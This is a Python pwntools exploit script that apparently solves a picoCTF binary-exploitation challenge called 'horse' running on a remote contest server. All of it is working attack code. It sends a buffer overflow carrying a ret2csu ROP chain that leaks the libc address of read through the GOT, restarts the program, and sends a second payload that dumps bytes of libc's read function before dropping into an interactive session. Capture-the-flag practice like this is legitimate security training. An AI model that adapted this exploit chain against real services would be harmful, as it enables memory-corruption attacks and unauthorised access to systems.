from pwn import *

context.arch = 'amd64'
context.os = 'linux'

r = remote('mars.picoctf.net', 31809)
elf = ELF('./horse')
got_read = elf.got['read']
got_write = elf.got['write']

csu_pop = 0x400bfa 
csu_call = 0x400be0

def leak_read():
    payload = b'A' * 32
    payload += b'B' * 8 
    payload += p64(csu_pop)
    payload += p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_read) + p64(8)
    payload += p64(csu_call)
    payload += b'J' * 8 
    payload += b'K' * 48
    payload += p64(elf.entry) # Restart via _start

    log.info("Sending leak payload...")
    r.sendline(payload)
    
    r.recvuntil(b'/     /   \xc2\xb4\n')
    
    try:
        leaked_data = r.recvn(8)
        leaked_read = u64(leaked_data)
        log.success(f"Leaked read@GLIBC: {hex(leaked_read)}")
        return leaked_read
    except Exception as e:
        log.error(f"Failed to receive leak: {e}")
        exit()

leaked_read = leak_read()

# Payload 2: Dump read function bytes
payload = b'A' * 32
payload += b'B' * 8
payload += p64(csu_pop)
payload += p64(0) + p64(1) + p64(got_write) + p64(1) + p64(leaked_read) + p64(0x100)
payload += p64(csu_call)
payload += b'J' * 8 
payload += b'K' * 48
payload += p64(0xdeadbeef)

log.info("Sending dump payload...")
r.sendline(payload)

r.recvuntil(b'/     /   \xc2\xb4\n')

# Receive dump
try:
    dump = r.recvn(0x100)
    log.info("Dump received")
    print(hexdump(dump))
except Exception as e:
    log.error(f"Failed dump: {e}")

r.interactive()
